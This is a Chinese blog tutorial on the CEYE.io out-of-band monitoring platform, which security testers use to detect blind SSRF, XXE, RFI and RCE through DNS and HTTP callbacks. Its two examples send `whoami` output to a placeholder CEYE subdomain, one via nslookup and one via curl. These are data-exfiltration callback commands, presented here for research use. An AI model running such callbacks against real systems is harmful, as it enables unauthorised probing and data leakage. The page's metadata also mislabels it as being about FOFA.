---
layout: post
title: CEYE平台的使用
categories: [ 安全 ]
description: FOFA是一款非常强大的搜索引擎
keywords: 安全 
---


# CEYE 是什么

CEYE是一个用来检测带外（Out-of-Band）流量的监控平台，如DNS查询和HTTP请求。它可以帮助安全研究人员在测试漏洞时收集信息（例如SSRF / XXE / RFI / RCE）。

## CEYE的使用场景
 

漏洞检测或漏洞利用需要进一步的用户或系统交互。

一些漏洞类型没有直接表明攻击是成功的。如Payload触发了却不在前端页面显示。

这时候使用CEYE平台，通过使用诸如DNS和HTTP之类的带外信道，便可以得到回显信息。

##  CEYE如何使用

登录 CEYE.IO，在 [用户详情页](http://ceye.io/profile) 可以看到自己的域名标识符 identifier，对于每个用户，都有唯一的域名标识符 如 `abcdef.ceye.io` 。所有来自于 abcdef.ceye.io 或 *.abcdef.ceye.io 的 `DNS查询和HTTP请求`都会被记录。通过查看这些记录信息，安全研究人员可以确认并改进自己的漏洞研究方案。

DNS查询可以以多种不同的方式进行解析。CEYE.IO平台提供了一台DNS Server来解析域名。它的 nameserver address 被设置为自己的服务器IP，因此所有关于ceye.io 的域名的DNS查询最终都会被发送到CEYE的DNS服务器。

 
### 使用例子-nslookup
nslookup

```
 nslookup `whoami`.abcdef.ceye.io

Server:        127.1.1.1
Address:    127.1.1.1#53

Non-authoritative answer:
Name:    chan.abcdef.ceye.io
Address: 118.192.48.48
```


### 使用例子-http
 curl -X POST http://ip.port.abcdef.ceye.io/`whoami`?p=http -d data=http

## 参考

https://www.cnblogs.com/zhaijiahui/p/9160913.html